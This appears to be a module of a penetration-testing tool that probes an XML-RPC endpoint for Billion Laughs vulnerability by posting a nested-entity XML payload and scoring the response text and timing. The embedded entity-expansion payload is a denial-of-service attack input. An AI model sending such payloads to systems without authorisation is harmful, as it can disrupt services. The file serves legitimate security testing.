"""XML-RPC XML Bomb (Billion Laughs) resistance test"""
import time
import requests
from ptlibs.ptprinthelper import ptprint
__TESTLABEL__ = "XML-RPC XML Bomb resistance test"

class XMLBomb:
    def __init__(self, args, ptjsonlib, helpers, http_client, common_tests):
        self.args = args
        self.ptjsonlib = ptjsonlib
        self.helpers = helpers
        self.helpers.print_header(__TESTLABEL__)

    def run(self):
        # Entity expansion in <methodName> — this is where XML-RPC servers
        # actually expand entities (not in <value>)
        bomb = ('<?xml version="1.0"?>'
                '<!DOCTYPE lolz ['
                '  <!ENTITY lol "lol">'
                '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
                '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
                ']>'
                '<methodCall><methodName>&lol3;</methodName></methodCall>')

        try:
            start = time.time()
            r = requests.post(
                self.helpers.endpoint_url,
                data=bomb,
                headers={"Content-Type": "text/xml"},
                timeout=15,
                verify=False
            )
            elapsed = time.time() - start
        except Exception:
            elapsed = time.time() - start
            if elapsed >= 14:
                ptprint("XML Bomb caused timeout — possible DoS vulnerability!", "VULN",
                        not self.args.json, indent=4, colortext=True)
                self.ptjsonlib.add_vulnerability("PTV-XML-BOMB", node_key=self.helpers.node_key,
                    data={"evidence": f"Server timed out after {elapsed:.1f}s."})
            else:
                ptprint("XML Bomb test inconclusive.", "INFO", not self.args.json, indent=4)
            return

        body_lower = r.text.lower()

        # Server rejected entity expansion
        rejection_indicators = ["entity", "expansion", "too many", "billion laughs",
                                "dtd", "disallowed", "not allowed", "recursive"]
        if any(ind in body_lower for ind in rejection_indicators):
            ptprint("Server correctly rejected entity expansion.", "OK",
                    not self.args.json, indent=4)
            return

        lol_count = r.text.count("lol")
        if lol_count > 20:
            ptprint(f"XML Bomb processed — entity expanded ({lol_count}x)!", "VULN",
                    not self.args.json, indent=4, colortext=True)
            self.ptjsonlib.add_vulnerability("PTV-XML-BOMB", node_key=self.helpers.node_key,
                data={"evidence": f"Server expanded nested entities ({lol_count}x 'lol' in response). "
                                  f"Response time: {elapsed:.1f}s. Vulnerable to Billion Laughs DoS."})
        elif elapsed > 5:
            ptprint(f"XML Bomb caused slow response ({elapsed:.1f}s) — possible DoS!", "VULN",
                    not self.args.json, indent=4, colortext=True)
            self.ptjsonlib.add_vulnerability("PTV-XML-BOMB", node_key=self.helpers.node_key,
                data={"evidence": f"Server processing delay: {elapsed:.1f}s."})
        else:
            ptprint("Server appears resistant to XML Bomb.", "OK",
                    not self.args.json, indent=4)

def run(args, ptjsonlib, helpers, http_client, common_tests):
    XMLBomb(args, ptjsonlib, helpers, http_client, common_tests).run()